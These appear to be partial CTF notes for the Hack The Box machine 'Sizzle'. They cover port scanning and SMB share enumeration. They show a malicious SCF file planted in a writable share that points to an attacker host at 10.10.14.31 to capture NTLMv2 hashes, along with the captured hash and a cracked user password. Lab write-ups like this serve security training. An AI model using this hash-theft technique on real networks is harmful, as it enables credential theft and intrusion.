# Enumeration
## Nmap
```bash
nmap -sC -sV 10.10.10.103
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2022-11-22T10:34:04+00:00; -1s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-11-22T10:34:04+00:00; -1s from scanner time.
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2022-11-22T10:34:04+00:00; -1s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2022-11-22T10:34:04+00:00; -1s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2022-11-22T10:34:04+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Anonymous FTP which leads to no files.
LDAP enumeration needs a login.
Port 80 is and IIS server
ssl cert of sizzle.htb.local

## Port 443
certificate auth. HTB-SIZZLE-CA

## SMB
```bash
smbclient -L //10.10.10.103/ -N
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	Department Shares Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Operations      Disk      
	SYSVOL          Disk      Logon server share 
```
Check department shares
There is a bunch of stuff.
mounting the drive
```bash
sudo mount -t ctif '//10.10.10.103/Department Shares' /mnt
```
Found that the public user's folder can be written to.
Add a scf file to hopefully steal a hash.
```scf
[Shell]
Command=2
IconFile=\\10.10.14.31\share\this.ico
[Taskbar]
Command=ToggleDesktop
```
copy the file to the drive and start responder.
```hash
[SMB] NTLMv2-SSP Client   : 10.10.10.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:22fc6c0d15288ca6:70AA0CD951420015C36AF1FFBBB66855:010100000000000000B8D12338FED801D1921018AC7816C40000000002000800300047005900500001001E00570049004E002D004F00430059004A00550037005200420043005A00300004003400570049004E002D004F00430059004A00550037005200420043005A0030002E0030004700590050002E004C004F00430041004C000300140030004700590050002E004C004F00430041004C000500140030004700590050002E004C004F00430041004C000700080000B8D12338FED801060004000200000008003000300000000000000001000000002000005905BDC1D3E97DD97D44BCE92534837A367439B62C0E483FD5DA3075300F05250A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0033003100000000000000000000000000
```
Using hashcat password is
amanda:Ashare1972

Checking smb with the creds.
User can view the CertEnroll

Evil-winrm wont work.

# Port 443 (again)
Using the creds we can log into the certsrv endpoint.
